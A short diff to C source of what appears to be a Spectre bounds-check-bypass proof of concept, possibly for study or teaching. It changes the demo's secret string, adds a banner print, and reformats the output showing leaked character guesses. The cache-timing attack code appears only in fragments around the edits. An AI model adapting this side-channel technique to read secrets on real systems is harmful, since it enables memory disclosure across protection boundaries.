@@ -14,7 +14,7 @@ uint8_t unused1[64];
 uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
 uint8_t unused2[64];
 uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
-char* secretString = "!\"#ThisIsTheBabyBoomerTest";
+char* secretString = "Secret Key to test BOOM attack!#";
 
 /**
  * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
@@ -75,6 +75,7 @@ void victimFunc(uint64_t idx){
 }
 
 int main(void){
+    printf("Bound Check Bypass - Spectre Attack\n");
     uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
     uint64_t start, diff, passInIdx, randIdx;
     uint8_t dummy = 0;
@@ -130,7 +131,7 @@ int main(void){
         uint64_t hitArray[2];
         topTwoIdx(results, 256, output, hitArray);
 
-        printf("m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 
+        printf("m[0x%p] | sceret_char(%c) | guess_char(hits,score,value) 1.(%lu, %d, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0]); 
 
         // read in the next secret 
         ++attackIdx;
